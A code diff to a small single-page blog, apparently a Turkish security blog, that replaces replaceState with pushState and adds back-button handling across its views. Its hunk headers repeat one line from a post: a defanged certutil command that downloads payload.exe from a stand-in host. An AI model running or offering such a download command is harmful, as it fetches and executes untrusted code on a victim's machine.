@@ -414,7 +414,7 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
       ${p.body}
     `;
     window.scrollTo(0,0);
-    history.replaceState(null, '', '#' + id);
+    history.pushState({view:'post', id}, '', '#' + id);
     navPosts.classList.add('active');
     navAbout.classList.remove('active');
   }
@@ -424,7 +424,7 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
     detailEl.innerHTML = '';
     aboutEl.classList.remove('open');
     listEl.style.display = 'block';
-    history.replaceState(null, '', '#');
+    history.pushState({view:'list'}, '', '#');
     navPosts.classList.add('active');
     navAbout.classList.remove('active');
   }
@@ -435,10 +435,42 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
     detailEl.innerHTML = '';
     aboutEl.classList.add('open');
     window.scrollTo(0,0);
-    history.replaceState(null, '', '#hakkimda');
+    history.pushState({view:'about'}, '', '#hakkimda');
     navAbout.classList.add('active');
     navPosts.classList.remove('active');
   }
+
+  window.addEventListener('popstate', (e) => {
+  const hash = location.hash.replace('#','');
+  if(hash === 'hakkimda'){
+    listEl.style.display = 'none';
+    detailEl.classList.remove('open');
+    detailEl.innerHTML = '';
+    aboutEl.classList.add('open');
+    navAbout.classList.add('active');
+    navPosts.classList.remove('active');
+  } else if(hash){
+    const p = posts.find(x => x.id === hash);
+    if(p){
+      listEl.style.display = 'none';
+      aboutEl.classList.remove('open');
+      detailEl.classList.add('open');
+      detailEl.innerHTML = `
+        <a class="back-link" href="#" onclick="showList(); return false;">← tüm yazılar</a>
+        <h1>${p.title}</h1>
+        <div class="post-meta">${p.date}</div>
+        ${p.body}
+      `;
+    }
+  } else {
+    detailEl.classList.remove('open');
+    detailEl.innerHTML = '';
+    aboutEl.classList.remove('open');
+    listEl.style.display = 'block';
+    navPosts.classList.add('active');
+    navAbout.classList.remove('active');
+  }
+});
 
   renderList();
 
